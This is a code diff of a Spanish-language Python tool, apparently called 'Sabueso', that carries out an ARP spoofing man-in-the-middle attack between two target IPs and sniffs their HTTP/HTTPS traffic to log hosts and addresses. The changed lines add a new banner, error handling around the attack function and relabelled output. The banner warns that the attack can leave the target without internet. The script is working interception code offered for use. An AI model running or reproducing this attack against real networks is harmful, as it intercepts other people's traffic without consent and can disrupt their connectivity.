@@ -6,25 +6,34 @@ from socket import gethostbyaddr,herror
 from platform import system
 from subprocess import check_output
 from colorama import init,Fore
-import time
 
 init()
 
 logo = '''
+\033[0;40;35m
+ ▗▄▄▖ ▗▄▖ ▗▄▄▖ ▗▖ ▗▖▗▄▄▄▖ ▗▄▄▖ ▗▄▖ 
+▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌
+ ▝▀▚▖▐▛▀▜▌▐▛▀▚▖▐▌ ▐▌▐▛▀▀▘ ▝▀▚▖▐▌ ▐▌
+▗▄▄▞▘▐▌ ▐▌▐▙▄▞▘▝▚▄▞▘▐▙▄▄▖▗▄▄▞▘▝▚▄▞▘
 
-\033[0;32m██    ██ ██████  ██████   ██████  ███    ██ 
-\033[0;32m██    ██ ██   ██ ██   ██ ██    ██ ████   ██ 
-\033[0;31m██    ██ ██████  ██████  ██ ██ ██ ██ ██  ██ 
-██    ██ ██   ██ ██   ██ ██ ██ ██ ██  ██ ██ 
- ██████  ██   ██ ██████   █ ████  ██   ████ 
-                                            
-\033[0;40;31mSabueso v 1.0                                      
 
-\033[33mADVERTENCIA --> esta herramienta puede afectar la conexion de la maquina objetivo al inteceptar paquetes
+\033[0;40;31m[+] por Urb@n --> https://github.com/Urban20                                      
+
+\033[33m[X] ADVERTENCIA\nesta herramienta puede afectar la conexion de la maquina objetivo al inteceptar paquetes, dejandola sin internet o con una señal debil mientras dure el ataque
 '''
 ejecutando = True
 
-ataque =lambda ip1,ip2: arp_mitm(ip1,ip2)
+def ataque(ip1,ip2): 
+   global ejecutando
+  
+   try:
+      arp_mitm(ip1,ip2)
+
+   except Exception as e:
+      print(f'\n\033[0;40;31m[-] ocurrio un error durante el ataque >> {e}\033[0m\n')
+      ejecutando = False
+      exit(1)
+      
 def informacion(paquete):
    try:
       ip_http = re.search(r'(\d+\.\d+\.\d+\.\d+):https?',str(paquete)).group(1).strip()
@@ -37,7 +46,7 @@ def informacion(paquete):
 
 def sniffing():
 
-   conf.verb=0
+
    while ejecutando:
       try:
          func_sn = sniff(timeout=1,filter='tcp and ( port 80 or port 443 )')
@@ -48,9 +57,9 @@ def sniffing():
                #retorna la ip del destinatario
                p1 = informacion(func_sn[x])[0]
 
-               print(Fore.WHITE+f'\r\n[+] {gethostbyaddr(pqt)[0]}\n[+] ip numerica > {pqt}\n[+] destinatario > {p1}\r\n')
+               print(Fore.WHITE+f'\r\n[+] host > {gethostbyaddr(pqt)[0]}\n[+] ip numerica > {pqt}\n[+] ipv4 implicado > {p1}\r\n')
 
-            except herror: print(Fore.WHITE+f'\r\n[+] ip numerica > {pqt}\n[+] destinatario > {p1}\n\r')
+            except herror: print(Fore.WHITE+f'\r\n[+] ip numerica > {pqt}\n[+] ipv4 implicado > {p1}\n\r')
 
       except TypeError: pass
 
